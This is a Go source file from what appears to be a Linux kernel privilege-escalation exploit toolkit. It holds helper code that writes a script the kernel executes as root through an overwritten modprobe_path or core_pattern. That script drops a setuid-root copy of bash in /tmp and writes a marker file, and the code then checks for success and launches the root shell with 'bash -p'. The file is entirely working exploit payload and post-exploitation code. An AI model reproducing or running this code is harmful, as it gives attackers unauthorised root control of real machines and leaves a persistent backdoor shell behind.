package kernelprivesc

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"strconv"
)

// ShellArtifact bundles the filesystem paths a method uses to drop and detect
// the root shell. All paths are PID-suffixed so concurrent runs and stale
// root-owned files from prior runs don't collide.
type ShellArtifact struct {
	// ScriptPath is the script the kernel executes as root (written to the
	// overwritten kernel global: modprobe_path / core_pattern pipe target).
	ScriptPath string
	// RootBashPath is the setuid-root bash copy the script drops.
	RootBashPath string
	// MarkerPath is the root-owned marker file the script writes (proves root
	// ran the script; used as a fallback to the setuid-bit check).
	MarkerPath string
}

// NewShellArtifact returns a PID-suffixed ShellArtifact under /tmp. The prefix
// scopes paths to the calling CVE (e.g. its ExpName()).
func NewShellArtifact(prefix string) ShellArtifact {
	pid := strconv.Itoa(os.Getpid())
	return ShellArtifact{
		ScriptPath:   "/tmp/" + prefix + "_pe_" + pid,
		RootBashPath: "/tmp/" + prefix + "_rootbash_" + pid,
		MarkerPath:   "/tmp/" + prefix + "_pwned_" + pid,
	}
}

// RootShellScript returns the script body the kernel runs as root. It copies
// /bin/bash to RootBashPath with the setuid-root bit and writes a root-owned
// marker. The script is POSIX sh.
func (a ShellArtifact) RootShellScript() string {
	return "#!/bin/sh\n" +
		"cp /bin/bash " + a.RootBashPath + " 2>/dev/null\n" +
		"chmod 4755 " + a.RootBashPath + " 2>/dev/null\n" +
		"echo root-owned-by-kernel-privesc > " + a.MarkerPath + " 2>/dev/null\n" +
		"chmod 644 " + a.MarkerPath + " 2>/dev/null\n"
}

// PrepareScript writes the root-shell-dropping script to ScriptPath (chmod
// 0777) and removes any stale RootBashPath / MarkerPath from prior runs.
func (a ShellArtifact) PrepareScript() error {
	_ = os.Remove(a.RootBashPath)
	_ = os.Remove(a.MarkerPath)
	if err := os.WriteFile(a.ScriptPath, []byte(a.RootShellScript()), 0o777); err != nil {
		return fmt.Errorf("write root-shell script to %s: %w", a.ScriptPath, err)
	}
	return nil
}

// CheckEscalated reports whether the root-shell drop succeeded: RootBashPath
// exists with the setuid bit set, or MarkerPath exists (fallback).
func (a ShellArtifact) CheckEscalated() bool {
	if fi, err := os.Stat(a.RootBashPath); err == nil && fi.Mode()&os.ModeSetuid != 0 {
		return true
	}
	if _, err := os.Stat(a.MarkerPath); err == nil {
		return true
	}
	return false
}

// DropRootShell execs the setuid-root bash copy with -p (preserves euid=0)
// from the caller's process. MUST be called from the parent (init user
// namespace), not from inside CLONE_NEWUSER — a setuid binary exec'd in a
// user namespace maps uid 0 to the caller's host uid and is not real root.
// Returns nil if the shell ran; an error if the setuid shell is missing or
// not setuid.
func DropRootShell(path string, stdin io.Reader, stdout, stderr io.Writer) error {
	fi, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("root shell %s missing: %w", path, err)
	}
	if fi.Mode()&os.ModeSetuid == 0 {
		return fmt.Errorf("root shell %s exists but setuid bit not set", path)
	}
	cmd := exec.Command(path, "-p")
	cmd.Stdin = stdin
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	return cmd.Run()
}
